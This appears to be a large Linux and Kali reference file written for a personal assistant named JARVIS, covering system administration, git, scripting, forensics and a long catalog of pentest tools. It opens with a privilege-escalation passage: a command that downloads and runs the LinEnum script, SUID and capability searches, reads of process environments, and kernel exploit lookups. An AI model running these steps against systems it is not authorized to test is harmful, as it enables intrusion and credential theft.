wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/l.sh && chmod +x /tmp/l.sh && /tmp/l.sh
# pspy (watch root processes without privileges):
./pspy64
```

### Manual checks
```
id; groups; sudo -ln
find / -perm -u=s -type f 2>/dev/null          # SUID binaries
find / -perm -g=s -type f 2>/dev/null          # SGID
find / -writable -type d 2>/dev/null
cat /etc/crontab; ls /etc/cron.*/
getcap -r / 2>/dev/null                        # file capabilities
ps -ef --forest
ss -tlnp
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /root 2>/dev/null
env; cat /proc/*/environ 2>/dev/null
```

### References
- gtfobins.github.io — unix binary abuse
- lolbas-project.github.io — Windows equivalent

Abusable unix bins: `vim`, `less`, `more`, `awk`, `find`, `python`, `perl`, `bash`, `ssh`, `scp`, `tar`, `gdb`, `cp`, `mv`, `env`, `systemctl`, `apt-get`.

### Kernel exploits
```
uname -a; cat /etc/os-release
searchsploit linux kernel $(uname -r | cut -d- -f1) privilege
```

---

## 27. /proc and /sys (kernel interfaces)

### /proc
```
cat /proc/cpuinfo
cat /proc/meminfo
cat /proc/loadavg
cat /proc/uptime
cat /proc/version
cat /proc/cmdline                    # kernel cmdline
cat /proc/mounts
cat /proc/modules                    # loaded kernel modules
cat /proc/net/tcp                    # raw TCP table (hex)
cat /proc/<pid>/status
cat /proc/<pid>/cmdline | tr "\0" " "
cat /proc/<pid>/environ | tr "\0" "\n"
cat /proc/<pid>/maps
ls -l /proc/<pid>/cwd
ls -l /proc/<pid>/fd/
cat /proc/<pid>/io
cat /proc/sys/kernel/hostname
cat /proc/sys/fs/file-max
cat /proc/sys/net/ipv4/ip_forward
```

### /sys
```
ls /sys/class/
cat /sys/class/power_supply/BAT0/capacity
cat /sys/class/thermal/thermal_zone0/temp     # millidegree C
cat /sys/class/backlight/*/brightness
cat /sys/block/sda/queue/scheduler
```

### sysctl
```
sysctl -a | grep ip_forward
sudo sysctl -w net.ipv4.ip_forward=1
# Persistent:
echo "net.ipv4.ip_forward = 1" | sudo tee /etc/sysctl.d/99-custom.conf
sudo sysctl --system
# Common tweaks:
net.ipv4.tcp_fastopen = 3
net.core.rmem_max = 16777216
vm.swappiness = 10
kernel.dmesg_restrict = 1
```

---

## 28. systemd — deep reference

### Unit types
```
.service   long-running daemon
.socket    socket activation
.timer     scheduled activation
.path      activates on filesystem change
.mount     mountpoint
.target    grouping (like runlevel)
.slice     cgroup resource slice
.scope     externally-created cgroup scope
```

### User units (no root)
```
systemctl --user ...
~/.config/systemd/user/<name>.service
```

### Key directives (skeleton)
```
[Unit]
After=network.target
Requires=postgresql.service
Wants=redis.service
Conflicts=other.service

[Service]
Type=simple
ExecStart=/usr/bin/cmd
ExecStartPre=/bin/sh -c "mkdir -p /run/foo"
ExecStop=/bin/kill -TERM $MAINPID
ExecReload=/bin/kill -HUP $MAINPID
User=myuser
Group=mygroup
Environment="KEY=val"
EnvironmentFile=/etc/default/myprog
WorkingDirectory=/opt/myprog
Restart=on-failure
RestartSec=5s
TimeoutStartSec=30
StandardOutput=journal
StandardError=journal
# Hardening:
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
```

### Timers
```
[Timer]
OnCalendar=*-*-* 02:00:00
Persistent=true
Unit=backup.service

[Install]
WantedBy=timers.target

sudo systemctl enable --now backup.timer
systemctl list-timers
```

### Drop-ins
```
sudo systemctl edit nginx.service    # creates /etc/systemd/system/nginx.service.d/override.conf
# Add only the directives you want to override.
sudo systemctl daemon-reload
sudo systemctl restart nginx
```

### Useful control cmds
```
systemctl show <unit>
systemctl cat <unit>
systemctl list-dependencies <unit>
systemctl mask <unit>
systemctl unmask <unit>
systemctl is-enabled / is-active <unit>
journalctl -u <unit> -f
loginctl list-sessions
```

---

## 29. Docker & Podman (advanced)

### Lifecycle
```
docker run --name web -d -p 8080:80 -v data:/data -e ENV=prod -w /app \
  --restart unless-stopped --cap-drop=ALL --cap-add=NET_BIND_SERVICE \
  --read-only --tmpfs /tmp nginx:alpine
docker stop web; docker rm web
docker update --memory=512m --cpus=1.5 web
docker events
docker stats
docker inspect web
docker inspect -f "{{.NetworkSettings.IPAddress}}" web
docker logs -f --tail 200 web
docker cp web:/etc/nginx.conf /tmp/
docker exec -it web sh
docker diff web
```

### Images
```
docker images
docker image prune -f
docker system prune -a --volumes
docker history nginx:alpine
docker save -o nginx.tar nginx:alpine
docker load -i nginx.tar
docker tag src:latest target:v1
docker push myreg/target:v1
docker build -t myapp:dev .
docker buildx build --platform linux/amd64,linux/arm64 -t myapp:multi --push .
```

### Compose
```
docker compose up -d
docker compose ps
docker compose logs -f web
docker compose exec web bash
docker compose down -v
docker compose config
docker compose pull; docker compose up -d
```

### Networking
```
docker network ls
docker network create mynet
docker run --network mynet ...
docker network inspect mynet
docker run --network host ...
docker run -p 127.0.0.1:8080:80 ...
```

### Volumes
```
docker volume ls
docker volume create data
docker run -v data:/app ...         # named
docker run -v /host/path:/app ...   # bind
docker volume prune
```

### Podman
```
podman ps; podman run ...
podman generate systemd --name web > web.service
podman kube play my.yaml
```

---

## 30. Git — advanced recipes

### Inspect
```
git log --oneline --graph --decorate --all -20
git log -p -- path/file
git log --author="Ulrich" --since="2 weeks ago"
git log --grep="fix.*race"
git log -S "functionName"                # pickaxe
git log -L :funcName:path                # history of a function
git blame -L 10,30 file
git show <sha>:path/to/file
git diff HEAD~3..HEAD -- path
git diff --stat --word-diff
```

### Staging / undo
```
git add -p                               # interactive
git reset                                # unstage all
git reset HEAD path                      # unstage one
git reset --hard HEAD                    # nuke local
git reset --soft HEAD~1                  # undo last commit, keep staged
git reset --mixed HEAD~1                 # undo last commit, unstage
git restore path
git restore --source=HEAD~3 path
git restore --staged path
git revert <sha>
git checkout -
git switch -c feature
```

### Rebase / merge / cherry-pick
```
git rebase main
git rebase -i HEAD~5
git rebase --onto newbase oldbase feature
git merge --no-ff feature
git merge --squash feature
git cherry-pick <sha>
git cherry-pick A..B                     # range (A excl, B incl)
```

### Stash
```
git stash
git stash -u                             # include untracked
git stash list
git stash show -p stash@{0}
git stash pop
git stash branch newbranch stash@{0}
```

### Bisect
```
git bisect start
git bisect bad
git bisect good v1.2.0
# test, then: git bisect good/bad ...
git bisect reset
git bisect run ./test.sh                 # automated
```

### Submodules
```
git submodule add <url> deps/foo
git submodule update --init --recursive
git submodule foreach "git pull origin main"
git submodule deinit -f deps/foo; git rm deps/foo
```

### Worktrees
```
git worktree add ../feature-x feature-x
git worktree list
git worktree remove ../feature-x
```

### Recovery
```
git reflog
git reset --hard HEAD@{2}
git fsck --lost-found
```

### Rewriting history (dangerous — feature branches only)
```
git commit --amend
git commit --amend --no-edit
git rebase -i HEAD~N
git filter-repo --path secret --invert-paths
```

---

## 31. Bash / Zsh scripting idioms

### Safe header
```
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'
trap "echo ERR on line \$LINENO; exit 1" ERR
trap "rm -f \$tmp" EXIT
tmp=$(mktemp)
```

### Arg parsing
```
usage() { echo "usage: $0 [-v] [-o out] input"; exit 1; }
verbose=0; out=/dev/stdout
while getopts "vo:h" opt; do
  case $opt in
    v) verbose=1 ;;
    o) out=$OPTARG ;;
    h|*) usage ;;
  esac
done
shift $((OPTIND-1))
input=${1:?input required}
```

### String manipulation
```
var="hello world"
echo "${var^^}"            # HELLO WORLD
echo "${var,,}"            # hello world
echo "${var/world/earth}"  # replace first
echo "${var//o/0}"         # replace all
echo "${var:0:5}"          # substring
echo "${#var}"             # length
echo "${var##*/}"          # basename
echo "${var%/*}"           # dirname
echo "${var:-default}"     # default if empty
echo "${var:=default}"     # assign default if empty
```

### Arrays
```
arr=(a b c)
echo "${arr[0]}"; echo "${arr[@]}"; echo "${#arr[@]}"
arr+=(d)
for x in "${arr[@]}"; do echo "$x"; done
declare -A map
map[key]=val
echo "${map[key]}"
for k in "${!map[@]}"; do echo "$k=${map[$k]}"; done
```

### Process management
```
cmd &
wait $!
wait
xargs -P 8 -I{} cmd {} < inputs.txt
parallel -j 8 cmd {} :::: inputs.txt
```

### Error patterns
```
if ! cmd; then echo "cmd failed" >&2; exit 1; fi
output=$(cmd) || { echo "bad"; exit 1; }
cmd || true              # ignore error
```

### Common checks
```
command -v git >/dev/null || { echo "install git"; exit 1; }
[[ -f /etc/hosts ]] && ...
[[ -d /tmp ]] && ...
[[ -z "$VAR" ]] && echo "empty"
[[ -n "$VAR" ]] && echo "set"
[[ "$a" == "$b" ]]
[[ "$a" =~ ^[0-9]+$ ]]
```

---

## 32. sed / awk / jq — recipe book

### sed
```
sed "s/foo/bar/g" file
sed -i "s/foo/bar/g" file                # in-place
sed -i.bak "s/foo/bar/g" file            # with backup
sed -n "5,10p" file                      # lines 5-10
sed -n "/pattern/p" file
sed "/pattern/d" file
sed "10,$d" file
sed -e "s/a/b/" -e "s/c/d/" file
sed "s|/path/old|/path/new|g" file       # alt delimiter
```

### awk
```
awk "{print \$1}" file
awk -F: "{print \$1,\$7}" /etc/passwd
awk "\$3 > 100 {print}" file
awk "NR==10"
awk "NR%2==0"
awk "!seen[\$0]++" file                  # dedupe preserving order
awk "{sum+=\$1} END {print sum}" file
awk "{print NR, \$0}"
awk "length(\$0) > 80"
awk "BEGIN{FS=\",\"; OFS=\"|\"} {\$1=\$1; print}"   # CSV -> PSV
awk "END{print NR}" file                 # wc -l alt
```

### jq
```
jq . file.json
jq -c "." file.json
jq ".items[]" file.json
jq ".items[] | select(.active)"
jq ".items | length"
jq ".items | map(.name)"
jq ".items[] | {name, email: .contact.email}"
jq -r ".items[].name"
jq "keys"
jq "paths" file.json
jq --arg u "alice" ".users[] | select(.name==\$u)" file.json
# Update:
jq ".items[0].name = \"new\"" file.json
jq ".items += [{\"name\":\"new\"}]" file.json
jq "del(.sensitive)" file.json
```

### cut / paste / sort / uniq
```
cut -d: -f1,3 /etc/passwd
cut -c1-10 file
paste -d"," a.txt b.txt
sort file | uniq
sort file | uniq -c | sort -rn
sort -t, -k2 -n file.csv
sort -u file
```

### tr
```
tr "[:upper:]" "[:lower:]" < file
tr -d "\r" < dos.txt > unix.txt
tr -s " "
tr "\n" "," < file
```

### xargs
```
ls *.log | xargs -I{} gzip {}
find . -name "*.pyc" -print0 | xargs -0 rm
xargs -n 1 < list.txt
xargs -P 4 -n 1 cmd < list.txt
```

---

## 33. Regex reference (PCRE / ERE)

```
.          any char (except newline unless /s)
*          0+ (greedy)
+          1+ (greedy)
?          0 or 1 / lazy modifier on *,+,{}
{n,m}      between n and m
^  $       start / end of line
\b \B      word boundary / non-boundary
\d \D      digit / non-digit
\w \W      word-char / non-word
\s \S      whitespace / non
[abc]      class
[^abc]     negated
[a-z]      range
(x|y)      alternation
(?:...)    non-capturing group
(?=...)    positive lookahead
(?!...)    negative lookahead
(?<=...)   positive lookbehind (PCRE)
(?<!...)   negative lookbehind
\1 \2      backrefs
```

Common patterns:
```
IPv4:      \b(?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\b
Email:     [A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}
URL:       https?://[^\s]+
UUIDv4:    [0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}
ISO date:  \d{4}-\d{2}-\d{2}
```

---

## 34. Networking protocols — practical

### DNS record types
```
A      IPv4
AAAA   IPv6
CNAME  alias
MX     mail exchanger (priority + host)
TXT    text (SPF, DKIM, verification tokens)
NS     name server
SOA    start of authority
PTR    reverse DNS
SRV    service (port + host)
CAA    cert authority authorization
```

### HTTP status classes
```
1xx  info (100 Continue, 101 Switching)
2xx  success (200 OK, 201 Created, 204 No Content, 206 Partial)
3xx  redirect (301 Moved, 302 Found, 304 Not Modified, 307/308)
4xx  client (400 Bad, 401 Unauth, 403 Forbidden, 404, 405, 409, 418, 429)
5xx  server (500 Internal, 502 Bad Gateway, 503 Unavailable, 504 Timeout)
```

### TCP flags
```
SYN  start connection
ACK  acknowledge
FIN  graceful close
RST  abrupt close / refuse
PSH  push buffered data
URG  urgent pointer
```

### TLS handshake (simplified)
```
1. ClientHello (versions, ciphers, SNI, ALPN)
2. ServerHello (chosen cipher, cert)
3. Certificate (X.509 chain)
4. ServerKeyExchange / CertificateVerify
5. Finished — encrypted from here
```

### Common ports
```
20/21  FTP                    443    HTTPS
22     SSH                    445    SMB
23     telnet                 465    SMTPS
25     SMTP                   514    syslog
53     DNS                    587    SMTP submission
67/68  DHCP                   636    LDAPS
80     HTTP                   993    IMAPS
88     Kerberos               995    POP3S
110    POP3                   1433   MSSQL
123    NTP                    1521   Oracle
135    MS RPC                 2049   NFS
137/139 NetBIOS               3306   MySQL
143    IMAP                   3389   RDP
161    SNMP                   5432   PostgreSQL
389    LDAP                   5900   VNC
6379   Redis                  6443   k8s API
8080/8443 alt HTTP/S          27017  MongoDB
```

---

## 35. TLS / crypto primitives

### openssl
```
openssl s_client -connect host:443 -servername host
openssl s_client -connect host:443 -showcerts > chain.pem
openssl x509 -in cert.pem -text -noout
openssl x509 -in cert.pem -noout -dates -subject -issuer
openssl x509 -in cert.pem -noout -fingerprint -sha256
openssl req -new -newkey rsa:4096 -nodes -keyout key.pem -out req.csr
openssl req -in req.csr -text -noout
openssl genrsa -out key.pem 4096
openssl rsa -in key.pem -pubout -out pub.pem
openssl genpkey -algorithm ED25519 -out ed25519.pem
openssl dgst -sha256 file
openssl enc -aes-256-cbc -pbkdf2 -salt -in in -out out.enc
openssl enc -d -aes-256-cbc -pbkdf2 -in out.enc -out restored
openssl rand -hex 32
openssl rand -base64 24
# Convert:
openssl x509 -in cert.der -inform der -out cert.pem -outform pem
openssl pkcs12 -in bundle.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in bundle.pfx -nokeys -out cert.pem
openssl x509 -in cert.pem -noout -ext subjectAltName
```

### GPG
```
gpg --gen-key
gpg --full-generate-key
gpg --list-keys
gpg --list-secret-keys --keyid-format LONG
gpg --export -a "Ulrich" > pub.asc
gpg --export-secret-keys -a "Ulrich" > priv.asc
gpg --import pub.asc
gpg --encrypt -r recipient@email file
gpg --decrypt file.gpg
gpg --sign file
gpg --detach-sign file
gpg --verify file.sig file
gpg --armor --detach-sign file
gpg --delete-secret-keys <keyid>
gpg --edit-key <keyid>
```

### SSH keys
```
ssh-keygen -t ed25519 -C "ulrich@jarvis" -f ~/.ssh/id_ed25519
ssh-keygen -t rsa -b 4096 -C ...
ssh-keygen -y -f ~/.ssh/id_ed25519 > pub.txt
ssh-keygen -l -f ~/.ssh/id_ed25519.pub
ssh-keygen -E sha256 -lf pub.pub
ssh-add ~/.ssh/id_ed25519
ssh-add -l
ssh-add -D
ssh-keygen -p -f ~/.ssh/id_ed25519       # change passphrase
ssh-copy-id user@host
ssh-keyscan host >> ~/.ssh/known_hosts
```

---

## 36. Reverse engineering / binary tools

```
file binary
strings -a -n 6 binary | less
strings -e l binary                    # UTF-16 LE
hexdump -C binary | less
xxd binary | less
xxd -r -p patch.hex binary             # patch bytes back
objdump -h binary                      # sections
objdump -d binary | less               # disassembly
objdump -D binary | less               # everything (incl data)
objdump -p binary                      # headers
readelf -a binary
readelf -d binary                      # dynamic/needed libs
nm binary
nm -D binary
ldd binary
strace -f -e trace=openat,read,write -o log cmd
ltrace -f -o log cmd
gdb binary
  run
  break main
  stepi; nexti; continue
  info registers
  x/32xb $rsp
  disas main
  bt
  info proc mappings
radare2 binary
  aaa
  afl
  pdf @ main
  s main; V
  /x deadbeef
  wx 90909090 @ offset
checksec --file=binary                 # RELRO/canaries/NX/PIE
ghidra                                 # GUI decompiler
```

---

## 37. Forensics — detail

### Disk imaging
```
sudo dd if=/dev/sdX of=image.dd bs=4M status=progress
sudo dcfldd if=/dev/sdX hash=sha256 hashwindow=1G of=image.dd
sudo mount -o ro,loop,offset=$((512*2048)) image.dd /mnt
```

### File carving / metadata
```
binwalk firmware.bin
binwalk -e firmware.bin
foremost -i image.dd -o carved/
scalpel -c /etc/scalpel/scalpel.conf -o out image.dd
exiftool image.jpg
mediainfo video.mp4
steghide extract -sf image.jpg
outguess -r image.jpg out.txt
zsteg image.png
stegseek image.jpg wordlist.txt
```

### Memory forensics (Volatility 3)
```
vol -f memdump.lime windows.info
vol -f dump linux.pslist
vol -f dump linux.bash
vol -f dump windows.netscan
vol -f dump windows.hashdump
vol -f dump windows.cmdline
vol -f dump windows.malfind
```

### Sleuth Kit
```
mmls image.dd                          # partition table
fsstat -o 2048 image.dd
fls -r -o 2048 image.dd | less
icat -o 2048 image.dd <inode> > file
autopsy
```

### Log forensics
```
last -F                                # wtmp
lastb -F                               # btmp (failed)
who /var/log/wtmp
grep sshd /var/log/auth.log | grep Failed
aureport -au
ausearch -m USER_LOGIN -ts today
journalctl --disk-usage
journalctl --vacuum-size=500M
```

---

## 38. Performance tuning

```
top / htop / btop
vmstat 1
iostat -xz 1
sar -n DEV 1                           # network (needs sysstat)
pidstat 1
free -h
slabtop
iotop
atop -a
nmon
perf top
perf record -F 99 -p <pid> -g -- sleep 30; perf report
perf stat -a sleep 5
strace -c -p <pid>
strace -f -e trace=openat,connect cmd
ltrace -c cmd
bpftrace -e "tracepoint:syscalls:sys_enter_open { printf(\"%s\n\", str(args->filename)); }"
tcpdump + wireshark
mtr
```

### "System slow" starter
```
uptime                                 # load avg
free -h                                # swap used?
vmstat 1 5                             # si/so nonzero?
iostat -xz 1 5                         # await >10ms?
ps aux --sort=-%cpu | head
ps aux --sort=-%mem | head
dmesg | tail
journalctl -p err --since "-10 min"
```

---

## 39. Troubleshooting playbooks

### No internet
```
ping -c 3 1.1.1.1
ping -c 3 google.com
ip -br a
ip route
nmcli dev status
sudo systemctl restart NetworkManager
sudo wg
cat /etc/resolv.conf
getent hosts google.com
# Override DNS temporarily:
sudo sh -c "echo 'nameserver 1.1.1.1' > /etc/resolv.conf"
```

### No audio
```
pactl info
pactl list short sinks
pactl list short sources
pw-cli info 0
systemctl --user restart pipewire pipewire-pulse wireplumber
dmesg | grep -iE "audio|snd"
alsamixer                              # check muted (M key)
pavucontrol
```

### No display / stuck X
```
# From TTY (Ctrl+Alt+F3):
sudo systemctl restart lightdm
# Restart WM only (keeps session):
DISPLAY=:0 xfwm4 --replace &
sudo pkill -KILL -u "$USER"
cat ~/.local/share/xorg/Xorg.0.log | grep EE
```

### Boot fails
```
# GRUB: press 'e', add "single" or "systemd.unit=rescue.target"
# Emergency shell: add "init=/bin/bash"
# After rescue:
mount -o remount,rw /
journalctl -b -p err
systemctl list-units --state=failed
```

### Disk full
```
df -h
du -sh /var/* 2>/dev/null | sort -h | tail
du -sh ~/.cache/* 2>/dev/null | sort -h | tail
journalctl --vacuum-size=200M
sudo apt clean
sudo apt autoremove --purge
docker system prune -af --volumes
find /var/log -name "*.log" -size +100M
```

### High CPU / load
```
ps aux --sort=-%cpu | head -10
top -o %CPU
perf top
docker stats
systemd-cgtop
sudo cat /proc/<pid>/stack
sudo strace -p <pid> -c
```

### Process won't die
```
kill -15 <pid>
kill -9 <pid>
# Uninterruptible sleep (D state) — IO stuck:
ps -eo pid,stat,cmd | awk "\$2 ~ /D/"
cat /proc/<pid>/stack
cat /proc/<pid>/wchan
# Zombie (Z):
ps -eo pid,ppid,stat,cmd | awk "\$3 ~ /Z/"
# Kill parent to reap.
```

### Frozen terminal / SSH stuck
```
Ctrl+q             # unlock if XON/XOFF
reset
stty sane
# SSH escape (after newline):
~.   disconnect
~#   list forwardings
~?   help
```

---

## 40. Text processing — perl one-liners

```
perl -pe "s/foo/bar/g" file                    # like sed
perl -ne "print if /pattern/" file             # like grep
perl -lane "print \$F[2]" file                 # field 3 (like awk)
perl -i -pe "s/foo/bar/g" file                 # in-place
perl -i.bak -pe "s/foo/bar/g" file
perl -0777 -pe "s/start.*?end//gs" file        # slurp + multiline
perl -MJSON::PP -E "say encode_json({a=>1,b=>[2,3]})"
perl -MTime::Piece -E "say Time::Piece->new->ymd"
# Sum column 2:
perl -lane "\$s+=\$F[1]; END{print \$s}" file
```

---

## 41. Kali tool catalog (abbreviated)

Full list: https://www.kali.org/tools/

### Information gathering
amass, assetfinder, subfinder, knockpy, sublist3r — subdomain enum.
fierce, dnsenum, dnsrecon — DNS recon.
theharvester — emails/names/subdomains across PGP/shodan/bing.
recon-ng — modular recon framework.
maltego — graph OSINT (GUI).
spiderfoot — automated OSINT (web GUI).
shodan/censys — API recon.
whois.
enum4linux, enum4linux-ng — SMB.
snmp-check, snmpwalk, onesixtyone — SNMP.
rpcinfo, rpcclient, smbclient — RPC/SMB.
ldapsearch, ldapdomaindump — LDAP.
ike-scan — IPsec VPN.
fping, hping3, arping.

### Vulnerability analysis
nikto, wpscan, joomscan, droopescan, cmseek.
nmap --script=vuln.
openvas / gvm (FOSS vuln scanner).
legion (GUI).
searchsploit (local exploit-db).

### Web apps
burpsuite, zaproxy.
ffuf, wfuzz, gobuster, feroxbuster, dirsearch, dirb — content discovery.
sqlmap — SQLi.
commix — command injection.
xsser — XSS.
nosqlmap — NoSQL injection.
wapiti — scanner.
whatweb, wappalyzer-cli — fingerprinting.
httpx (projectdiscovery) — HTTP toolkit.
cewl — custom wordlist from site.
paramspider, waybackurls — URL harvest.

### Exploitation
metasploit-framework (msfconsole, msfvenom).
exploitdb/searchsploit.
setoolkit — SE.
beef-xss — browser exploits.
routersploit — embedded.
evil-winrm — WinRM shell.
impacket — full suite: psexec.py, smbexec.py, wmiexec.py, GetNPUsers.py, secretsdump.py, smbclient.py, ticketer.py, getTGT.py.
crackmapexec (cme) -> nxc (netexec) — AD swiss-army.

### Post-exploitation
mimikatz (Windows).
bloodhound / bloodhound-python / sharphound — AD graphing.
pypykatz — pure-Python mimikatz.
laudanum — web shells collection.
weevely — PHP web shell manager.
chisel, ligolo-ng, sshuttle, ssh -L/-R/-D — tunneling.
proxychains / proxychains4.

### Password attacks
hashcat, john (+jumbo), hashid.
hydra, medusa, ncrack, patator — online brute.
crowbar — RDP/VNC/SSH brute.
cewl, crunch, cupp — wordlist gen.
seclists, rockyou.txt.gz.
stegseek, steghide, outguess, zsteg — steg crack.
pdfcrack, rarcrack, fcrackzip — archive crack.

### Wireless
aircrack-ng suite.
reaver, bully — WPS.
wifite — automation.
kismet, horst — sniffers.
bettercap — MITM + wifi + BT + HID.
hcxdumptool, hcxpcapngtool — PMKID.
mdk3/mdk4 — wifi DoS.
fern-wifi-cracker — GUI.
wifiphisher — rogue AP.
pixiewps — offline WPS pin.

### Reverse engineering
ghidra, radare2, cutter, rizin.
gdb + pwndbg / gef / peda.
objdump, readelf, nm, strings, ltrace, strace.
checksec.
one_gadget.
pwntools.
angr — symbolic execution.
libc-database.
apktool, jadx — Android.
dex2jar, jd-gui — Java.

### Sniffing & spoofing
wireshark, tshark, tcpdump.
bettercap, ettercap, mitmproxy.
dsniff, fragrouter.
responder — LLMNR/NBT-NS poisoning.
mitm6 — IPv6 mitm.
dnschef — DNS mitm proxy.
yersinia — L2 attacks.
ssh-mitm.

### Forensics
autopsy, sleuthkit (tsk_*, fls, icat).
volatility3, volatility2 — memory.
binwalk, foremost, scalpel, photorec, testdisk — carving/recovery.
dc3dd, dcfldd, dd — imaging.
guymager — GUI imager.
exiftool, mediainfo, pdfid, peepdf, oletools — metadata.
regripper — Windows registry.
plaso/log2timeline — timelining.
chainsaw, hayabusa — Windows EVTX.

### Reporting
dradis, faraday, magictree, serpico, pwndoc.
cherrytree, obsidian — notebooks.

### Defensive
lynis, linpeas, chkrootkit, rkhunter, aide, samhain, auditd.
fail2ban, crowdsec, ossec, wazuh.
clamav, yara, loki, thor-lite.

---

## 42. Kali bookmarks (references)

- https://www.kali.org/docs/ — official Kali docs
- https://www.kali.org/tools/ — tool directory
- https://wiki.xfce.org/ — XFCE wiki
- https://wiki.archlinux.org/ — best Linux wiki (mostly applies to Debian too)
- https://debian.org/doc/ — canonical Debian docs
- https://man.archlinux.org/ — man pages fast search
- https://tldr.sh/ — `tldr <cmd>`
- https://explainshell.com/ — shell-line explainer
- https://cheat.sh/ — `curl cheat.sh/tar`
- https://gtfobins.github.io/ — SUID/sudo abuse
- https://lolbas-project.github.io/ — Windows equivalent
- https://www.exploit-db.com/ — exploit archive
- https://attack.mitre.org/ — ATT&CK
- https://www.offsec.com/metasploit-unleashed/ — free MSF training
- https://book.hacktricks.xyz/ — pentest methodology
- https://pentest-book.six2dez.com/ — similar
- https://nvd.nist.gov/ — CVE database

---

## 43. When JARVIS is unsure

1. Don't guess a command. `<cmd> --help 2>&1 | head -50` or `man <cmd>` and READ.
2. `tldr <cmd>` for common usage fast.
3. `type <cmd>` / `command -v <cmd>` to check if installed.
4. `apt-file search <path>` to find which package provides a file (needs `sudo apt-file update` first).
5. `curl cheat.sh/tar/extract` works offline-docs-dead situations.
6. Ask Ulrich when the right tool is fundamentally unclear. Don't run something that might be destructive on a guess.

---

## 44. Full Kali tool catalog (alphabetized by category)

What follows is the comprehensive Kali tool reference, split along the same categories Kali uses on https://www.kali.org/tools/ . Not every tool Kali has ever shipped is here — long-tail specialists and abandoned projects omitted — but every tool a working pentester reaches for should be.

Format: `toolname` — one-line description of what it does.

### 44.1 Information Gathering

`amass` — OWASP. Deep DNS/subdomain enum across 50+ sources.
`apt-file` — find which package provides a file; useful pre-install.
`arp-scan` — ARP sweep of a LAN; enumerates live hosts faster than ping.
`arping` — ARP ping single host.
`assetfinder` — fast subdomain finder; tomnomnom.
`axfr` — DNS zone transfer attempt (dig +short @ns example.com AXFR).
`bing-ip2hosts` — reverse-IP via Bing, finds virtual hosts.
`braa` — mass SNMP scanner, extremely fast.
`cdpsnarf` — CDP packet sniffer; maps Cisco topology.
`copy-router-config` — pull config from Cisco via SNMP.
`dig` — DNS queries; the right tool for most DNS questions.
`dirb` — classic web content brute.
`dmitry` — all-in-one host info (whois, netcraft, subdomains, ports).
`dnmap` — distributed nmap scanner.
`dns2tcp` — DNS tunneling tool.
`dnschef` — DNS proxy / MITM.
`dnsenum` — subdomain enum via dictionary + zone transfer attempts.
`dnsmap` — subdomain brute-force (smaller, older).
`dnsrecon` — DNS enum (records, zone transfer, brute, reverse).
`dnstracer` — traces DNS delegation path.
`dnswalk` — DNS data integrity checker.
`dotdotpwn` — directory traversal fuzzer (HTTP, FTP, TFTP, POP, IMAP).
`enum4linux` — Samba/SMB enum (shares, users, policies, password policy).
`enum4linux-ng` — modern rewrite of enum4linux.
`etherape` — graphical network activity monitor.
`faraday` — multi-user pentest IDE.
`fierce` — DNS recon (subdomain brute + nameserver probing).
`finalrecon` — OSINT orchestration wrapper.
`fping` — ping many hosts in parallel.
`fragroute` — route-level packet fragmentation testing.
`ghidra` — NSA reverse engineering framework (also in RE section).
`goofile` — Google-dork for specific file types on a domain.
`gospider` — fast, Go-based web spider.
`hping3` — custom TCP/IP packet crafting + scanner.
`ike-scan` — discovers and enumerates IKE/IPsec VPNs.
`ismtp` — SMTP user enumeration via VRFY/EXPN/RCPT.
`ivre` — scan orchestrator; aggregates nmap/masscan/zgrab into a DB.
`knock` / `knockpy` — python subdomain scanner.
`lbd` — load-balancer detector (HTTP/DNS).
`maltego` — OSINT graph analysis (GUI).
`masscan` — internet-scale port scanner (millions pps).
`metagoofil` — metadata extraction from public docs (PDF/DOC/etc).
`nbtscan` — NetBIOS name scanner.
`netdiscover` — passive+active ARP discovery of LAN hosts.
`nikto` — HTTP scanner.
`nmap` / `zenmap` — THE scanner; zenmap is the GUI.
`ntop` / `ntopng` — network traffic analyzer.
`oscanner` — Oracle assessment framework.
`osrframework` — username/email/etc. across social/search sites.
`p0f` — passive OS fingerprinting.
`pnscan` — multithreaded banner scanner.
`protos` — IP protocol (layer-3) scanner.
`psk-crack` — IKE aggressive-mode PSK cracker (see ike-scan).
`rainbowcrack` — rainbow-table generator + cracker.
`recon-ng` — modular recon framework with web UI.
`rsmangler` — permutations of a wordlist (case, leet).
`ruby-advisory-db` — vuln database for Ruby gems.
`scapy` — python packet-crafting library / repl.
`set` / `setoolkit` — social-engineering toolkit.
`sherlock` — find a username across 400+ sites.
`shodan` CLI — search Shodan from cmdline.
`sidguesser` — Oracle SID guesser.
`siege` — HTTP load/benchmark tool (dual-use for stress).
`smbclient` — Samba client; mount/list SMB shares.
`smbmap` — SMB share enumerator (perms and listing).
`smtp-user-enum` — Perl; enumerates SMTP users via VRFY/EXPN/RCPT.
`snmp-check` — walks SNMP v1/2c; pretty output.
`snmpwalk` — net-snmp's SNMP tree walker.
`spiderfoot` — automated OSINT with 200+ modules; web UI.
`ssldump` — dumps and parses SSL sessions from pcaps.
`sslscan` — fast TLS scanner (ciphers, versions, known issues).
`sslyze` — TLS scanner w/ regression tests + JSON output.
`subfinder` — fast subdomain finder (projectdiscovery).
`sublist3r` — subdomain enum across search engines.
`subzy` — subdomain takeover scanner.
`sylkie` — IPv6 network testing.
`tcpflow` — reconstructs TCP streams from pcaps to files.
`tcpreplay` — replay captured pcaps onto a network.
`theharvester` — emails/subs/names across PGP, bing, shodan etc.
`tor` — Tor daemon.
`tor-geoipdb` — Tor GeoIP database (used by tor).
`unicornscan` — userspace async port scanner.
`uniscan` — web vuln scanner.
`urlcrazy` — domain-typosquat generator.
`wafw00f` — web-application firewall detection.
`wappalyzer-cli` — web technology fingerprinting.
`whatweb` — HTTP fingerprinting (CMS, frameworks, servers).
`whois` — RFC 3912 domain registration lookup.
`wig` — CMS/framework identification.
`xprobe2` — active OS fingerprinting.
`zmap` — internet-scale port scanner (alternative to masscan).

